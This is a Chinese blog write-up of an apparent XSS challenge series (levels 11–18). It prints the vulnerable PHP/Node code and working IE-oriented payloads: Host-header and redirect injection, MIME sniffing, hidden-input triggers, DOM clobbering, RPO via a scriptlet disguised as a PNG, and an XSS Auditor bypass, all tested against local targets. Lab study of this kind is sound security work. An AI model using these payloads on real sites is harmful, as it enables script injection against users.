<p>收集了姿势挺开心，本来想一把梭直接怼，可是梭不够锋利。。。。。</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ali_xss_challenge/xss10.php?username=&#123;&#123;[].pop.constructor(&#x27;alert(1)&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="11-HOST"><a href="#11-HOST" class="headerlink" title="11 HOST"></a>11 HOST</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&quot;http&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> server = http.<span class="title function_">createServer</span>(<span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123; <span class="string">&quot;Content-Type&quot;</span> : <span class="string">&quot;text/html;charset=utf-8&quot;</span>, <span class="string">&quot;X-XSS-Protection&quot;</span> : <span class="string">&quot;0&quot;</span> &#125;);</span><br><span class="line">    res.<span class="title function_">end</span>( <span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;&#x27;</span> + req.<span class="property">headers</span>[<span class="string">&quot;host&quot;</span>] + <span class="string">&#x27;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;It works!&lt;/body&gt;&lt;/html&gt;&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">8000</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Running server on port 8000&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>node.js写的后端，一开始跑不起来，源码做了一点修改。</p>
<p>HOST头处有xss，这里仍然要针对ie（ie：mmp…）</p>
<p><a target="_blank" rel="noopener" href="https://labs.detectify.com/2016/10/24/combining-host-header-injection-and-lax-host-parsing-serving-malicious-data/">https://labs.detectify.com/2016/10/24/combining-host-header-injection-and-lax-host-parsing-serving-malicious-data/</a></p>
<p><strong>文章大体意思是在低版本的ie中，跳转过去的链接不会被urlencode。</strong>根据文章payload构造起来就比较简单了：</p>
<p>xss11.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 307 Redirect&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://192.168.1.128:8001%2f&lt;%2ftitle&gt;&lt;script&gt;alert(document.domain)&lt;%2fscript&gt;&lt;!--.baidu.com&#x27;</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>本地测试依然失败。。。</p>
<p>###12 preview</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    preview</span></span><br><span class="line"><span class="comment">    hint: MIME Sniffing</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="comment"># the request</span></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="comment"># get the content type</span></span><br><span class="line">    <span class="variable">$mime</span> = <span class="keyword">array</span>(</span><br><span class="line">      			<span class="string">&quot;application/octet-stream&quot;</span>,</span><br><span class="line">      			<span class="string">&quot;application/postscript&quot;</span>,</span><br><span class="line">      			<span class="string">&quot;application/x-cdf&quot;</span>,<span class="string">&quot;application/x-compressed&quot;</span>,</span><br><span class="line">      			<span class="string">&quot;application/x-zip-compressed&quot;</span>,</span><br><span class="line">      			<span class="string">&quot;audio/basic&quot;</span>,<span class="string">&quot;audio/wav&quot;</span>,<span class="string">&quot;audio/x-aiff&quot;</span>,</span><br><span class="line">      			<span class="string">&quot;video/avi&quot;</span>,<span class="string">&quot;video/mpeg&quot;</span>,<span class="string">&quot;video/x-msvideo&quot;</span>,</span><br><span class="line">      			<span class="string">&quot;image/png&quot;</span>,<span class="string">&quot;image/jpeg&quot;</span>,<span class="string">&quot;image/gif&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_CONTENT_TYPE), <span class="variable">$mime</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:&quot;</span>.<span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_CONTENT_TYPE));</span><br><span class="line">        <span class="comment">//header(&quot;X-Content-Type-Options: nosniff&quot;);</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># output</span></span><br><span class="line">    <span class="comment">// text/html; charset=ISO-8859-1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>简单看一下代码，首先请求获取到的URL，获取mime类型，如果mime是指定的，就设置http头，再次访问url。</p>
<p>这里考察IE的<strong>content sniffing</strong>:</p>
<blockquote>
<p><strong>有些服务器指定的不是一个正确的Content-Type头，所以IE为了兼容这些文件类型，它会将文件的前256个字节与已知文件头进行比较，然后得到一个结果…也就是<code>&lt;html&gt;</code>作为开头的话，会被认为是<code>text/html</code></strong></p>
</blockquote>
<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170908/b1fE6mlfdC.png" alt="mark"></p>
<p>图中内容来自<a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/224.html">https://xianzhi.aliyun.com/forum/read/224.html</a></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ali_xss_challenge/xss12.php?url=http://seaii-blog.com:8000/12.php</span><br></pre></td></tr></table></figure>

<p>12.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/octet-stream&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;&lt;script&gt;<span class="title function_ invoke__">alert</span>(document.domain)&lt;/script&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h3 id="13-REQUEST-URI"><a href="#13-REQUEST-URI" class="headerlink" title="13 REQUEST_URI"></a>13 REQUEST_URI</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    REQUEST_URI</span></span><br><span class="line"><span class="comment">    hint: 浏览器差异</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;REQUEST_URI:&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这题和前面第4题referer类似，都是利用<strong>ie在跳转时不会urlencode</strong>的问题。</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://seaii-blog.com:8000/xss13.php/&lt;svg/onload=alert(document.domain)&gt;&quot;</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>经过测试，html、js的跳转方法均不可用,例如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;http://seaii-blog.com:8000/xss13.php/&lt;svg/onload=alert(document.domain)&gt;&quot;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170908/hjlFLkd3Jg.png" alt="mark"></p>
<h3 id="14-HIDDEN"><a href="#14-HIDDEN" class="headerlink" title="14 HIDDEN"></a>14 HIDDEN</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    HIDDEN</span></span><br><span class="line"><span class="comment">    hint: 寻找合适的Trigger</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-XSS-Protection:0&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;x-ua-compatible&quot;</span> content=<span class="string">&quot;IE=10&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&#x27;&#x27;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;hidden&#x27;</span> name=<span class="string">&#x27;token&#x27;</span> value=<span class="string">&#x27;&lt;?php</span></span><br><span class="line"><span class="string">  echo htmlspecialchars($_GET[&#x27;</span>token<span class="string">&#x27;]); ?&gt;&#x27;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&#x27;submit&#x27;</span>&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p>似乎是个很经典的问题，输出点在标签中且存在<code>hidden</code>属性，导致很多事件都没有办法触发。</p>
<p>一般分为两种情况（input标签不能闭合）：</p>
<ol>
<li><p>输出点在hidden属性之前</p>
<p>可以覆盖type为其他，<code>&lt;input value=&quot;a&quot; src=1 onerror=alert(1) type=&quot;image&quot; type=&quot;hidden&quot;&gt;</code></p>
</li>
<li><p>输出点在hidden属性之后</p>
<ol>
<li>间接的方式来触发，比如<code>&#39; accesskey=&#39;x&#39; onclick=&#39;alert(/1/)</code>，然后按shift+alt+x触发xss</li>
<li>无交互触发，<code> &#39;style=&#39;behavior:url(?)&#39;onreadystatechange=&#39;alert(1)</code></li>
</ol>
</li>
</ol>
<p>payload（仅ie）:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ali_xss_challenge/xss14.php?token=%27style=%27behavior:url(?)%27onreadystatechange=%27alert(1)</span><br></pre></td></tr></table></figure>

<p>其实这道题还有一个必要条件，标签的属性值必须用<strong>单引号</strong>来包裹。</p>
<h3 id="15-Frame-Buster"><a href="#15-Frame-Buster" class="headerlink" title="15 Frame Buster"></a>15 Frame Buster</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Frame Buster</span></span><br><span class="line"><span class="comment">    hint: DOM Clobbering</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="variable">$page</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;page&quot;</span>]);</span><br><span class="line"><span class="variable">$regex</span> = <span class="string">&quot;/on([a-zA-Z])+/i&quot;</span>;</span><br><span class="line"><span class="variable">$page</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;style&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&#x27;xss15.php?page=&lt;?php</span></span><br><span class="line"><span class="string">if(preg_match($regex,$page))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo &quot;XSS Detected!&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">echo htmlspecialchars($page);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;&#x27;</span>&gt;&lt;/form&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;   </span><br><span class="line">    <span class="keyword">if</span>(top!=<span class="built_in">self</span>)&#123;</span><br><span class="line">        location=<span class="built_in">self</span>.location</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>一种防御iframe框架加载的方式，如果用框架加载的话，会让页面一直刷新。</p>
<p>题目又提示了DOM Clobbering，啥是DOM Clobbering？</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">abc</span> <span class="attr">def</span>=<span class="string">123</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">alert(abc.def)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果在<strong>IE8</strong>下，弹窗的结果将是123。同样，这道题中的self.location也可以用这种方式覆盖。我们可以用之前第8题中的方法，让这个漏洞在ie11中复活。</p>
<p>payload:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">x-ua-compatible</span> <span class="attr">content</span>=<span class="string">IE</span>=<span class="string">8</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/ali_xss_challenge/xss15.php?page=1&#x27; name=self location=&#x27;javascript:alert(document.domain)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="16-PHP-SELF"><a href="#16-PHP-SELF" class="headerlink" title="16 PHP_SELF"></a>16 PHP_SELF</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PHP_SELF</span><br><span class="line">hint: RPO Attack</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=10&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;styles.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;xss.png&quot;</span> style=<span class="string">&quot;display: none;&quot;</span>&gt;</span><br><span class="line">&lt;h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&amp;lt;&quot;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]);</span><br><span class="line"><span class="variable">$output</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&amp;gt;&quot;</span>,<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>提示是RPO，表示从来没有听过。。。来一篇文章<a target="_blank" rel="noopener" href="https://www.mbsd.jp/Whitepaper/rpo.pdf">https://www.mbsd.jp/Whitepaper/rpo.pdf</a></p>
<p>大体就是这意思（直接上代码可能更好理解一点）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-XSS-Protection: 0&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问<code>http://127.0.0.1/test/rpo.php</code>，输出<code>test/rpo.php</code>；</p>
<p>访问<code>http://127.0.0.1/test/rpo.php/a=1</code>，输出<code>test/rpo.php/a=1</code>；</p>
<p>访问<code>http://127.0.0.1/test/rpo.php/&lt;svg%2fonload=alert(1)&gt;</code>，就弹窗了耶。</p>
<p>这道题把尖括号给过滤了，我们能做的就是加载css，然后通过css再去加载js。</p>
<p>可以利用sct文件，但是缺陷就是sct必须要是在同域下.</p>
<p>可以发现题目还有一个xss.png….内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;scriptlet&gt;</span><br><span class="line">    &lt;implements type=&quot;behavior&quot;/&gt;</span><br><span class="line">    &lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ali_xss_challenge/xss16.php/&#123;&#125;*&#123;behavior:url(http://127.0.0.1/ali_xss_challenge/xss.png)&#125;*&#123;&#125;/</span><br></pre></td></tr></table></figure>

<p>通过css来触发xss的姿势似乎也有不少。。。</p>
<h3 id="17-passive-element-（-）"><a href="#17-passive-element-（-）" class="headerlink" title="17 passive element （***）"></a>17 passive element （***）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    passive element</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-Content-Type-Options: nosniff&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-FRAME-OPTIONS: DENY&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="string">&quot;content&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;div data-content=&#x27;&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$content</span>).<span class="string">&quot;&#x27;&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>各种http头都设置了，过滤也加上了，而且输出点在div，一个被动元素中。</p>
<p>废话少说，攒姿势吧。。。</p>
<p>payload（除ff，包括edge）:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ali_xss_challenge/xss17.php?content=%27onfocus=%27alert(1)%27%20contenteditable%20tabindex=%270%27%20id=%27xss#xss</span><br></pre></td></tr></table></figure>

<h3 id="18-graduate-（-）"><a href="#18-graduate-（-）" class="headerlink" title="18 graduate （***）"></a>18 graduate （***）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    graduate</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-Content-Type-Options: nosniff&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-FRAME-OPTIONS: DENY&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection: 1&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;textarea&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//Fix#001</span></span><br><span class="line"><span class="variable">$input</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;input&quot;</span>]);</span><br><span class="line"><span class="comment">//Fix#002</span></span><br><span class="line"><span class="variable">$input</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;\/&quot;</span>,<span class="variable">$input</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$input</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/textarea&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>输出点在textarea中，而且<code>/</code>被转义了，也就是说不能闭合标签，textarea又是一个优先级比较高的标签，想在这个标签内部搞事是很困难的。</p>
<p>一切看起来都那么无懈可击，但是我们注意到一个细节：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;X-XSS-Protection: 1&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这本来是告诉浏览器要开启XSS Auditor，看看我们伟大的ie是怎么做的，尝试插入一个<code>&lt;textarea&gt;</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ali_xss_challenge/xss18.php?input=%3Ctextarea%3E</span><br></pre></td></tr></table></figure>

<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170909/cdk0jeHAa9.png" alt="mark"></p>
<p>看到底下那句有点想笑，真的是讽刺。。。</p>
<p>这时前面的2个<code>&lt;textarea&gt;</code>已经失效了，后面的<code>&lt;/textarea&gt;</code>由于html的松散性根本没有影响，相当于textarea的牢笼已经被打破了，继续在后面插入<code>&lt;svg\onload=alert(document.domain)&gt;</code>，验证我们的猜想。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ali_xss_challenge/xss18.php?input=&lt;textarea&gt;&lt;svg onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170909/KAh3K0e59J.png" alt="mark"></p>
<p>可以看到标签已经成功逃逸出来了，但是由于X-XSS-Protection，onload被过滤了。。。但是不要忘了这个</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;input&quot;</span>]);</span><br></pre></td></tr></table></figure>

<p>比较老的套路了，payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ali_xss_challenge/xss18.php?input=&lt;textarea&gt;&lt;svg o&lt;script&gt;nload=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p>XSS Auditor还是chrome比较nb，ie给人一种秀操作惨翻车的感觉。。。</p>
